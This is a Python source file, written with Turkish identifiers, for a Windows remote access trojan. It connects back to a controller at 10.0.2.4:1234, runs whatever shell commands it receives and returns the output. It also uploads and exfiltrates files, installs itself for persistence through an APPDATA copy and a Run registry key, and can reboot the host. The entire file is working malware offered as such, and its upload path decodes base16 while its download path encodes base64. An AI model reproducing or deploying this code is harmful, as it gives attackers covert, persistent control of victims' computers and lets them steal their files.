import socket
import subprocess
import os
import base64
import time
import simplejson
import shutil
import sys

class baglanti:

    def __init__(self):
        self.sock = socket.socket()
        self.sock.connect(("10.0.2.4",1234))
        #self.sock.send("in\n".encode("utf-8"))
    def paket_coz(self):
        gelen_paket = ""
        while True:
            try:
                gelen_paket += self.sock.recv(2048).decode('utf-8')
                return simplejson.loads(gelen_paket)
            except ValueError:
                continue
        return gelen_paket
    def komut_isleme(self,komut):
        cikti = subprocess.check_output(komut, shell=True, stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
        self.paketleme(cikti)
    def paketleme(self,veri):
        paket = simplejson.dumps(veri)
        self.sock.send(paket.encode('utf-8'))
    def baslat(self):
            while True:
                try:
                    komut = self.paket_coz()
                    if komut[0] == "yükle" and len(komut) > 1:
                        with open(komut[1], "wb") as dosya:
                            dosya.write(base64.b16decode(komut[2]))
                        self.paketleme(komut[1] + " yüklendi")
                    elif komut == "quit":
                        self.sock.close()
                        break
                    elif komut == "ls":
                        self.komut_isleme("dir")
                    elif komut[:3] == "cat":
                        komut = komut.split(" ")
                        self.komut_isleme("type " + komut[1])
                    elif komut == "pwd":
                        self.komut_isleme("cd")
                    elif komut[:2] == "cd" and len(komut) > 2:
                        komut = komut.split(" ")
                        if len(komut) > 2:
                            boyut = len(komut)
                            yer_adi = ""
                            for a in range(1,boyut):
                                yer_adi += komut[a] + " "
                            os.chdir(yer_adi)
                        else:
                            os.chdir(komut[1])
                        self.komut_isleme("cd")
                    elif komut[:5] == "indir":
                        try:
                            komut = komut.split(' ')
                            with open(komut[1], "rb") as dosya:
                                self.paketleme(base64.b64encode(dosya.read()))
                        except Exception:
                            continue
                    elif komut[:6]=="yerles":
                        try:
                            komut = komut.split(' ')
                            dosya_uzantisi = os.environ["appdata"]+"\\"+komut[1]
                            if not os.path.exists(dosya_uzantisi):
                                shutil.copyfile(sys.executable,dosya_uzantisi)
                                kayit = "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v " + komut[1] + " /t REG_SZ /d " + dosya_uzantisi
                                subprocess.call(kayit,shell=True)
                                self.paketleme("Başarıyla yerleşti.")
                            else:
                                self.paketleme("Daha önce yerleşildi!")
                        except Exception:
                            self.paketleme("Yerleşmede hata oluştu!")
                    elif komut=="reboot":
                        self.paketleme("Bilgisayar kapatılıyor...")
                        self.sock.close()
                        subprocess.call("shutdown /r /t 0", shell=True)
                    else:
                        self.komut_isleme(komut)
                except Exception:
                    self.paketleme("Hata!")

while True:
    try:
        baglanti_kur = baglanti()
        baglanti_kur.baslat()
    except Exception:
        time.sleep(60)
        pass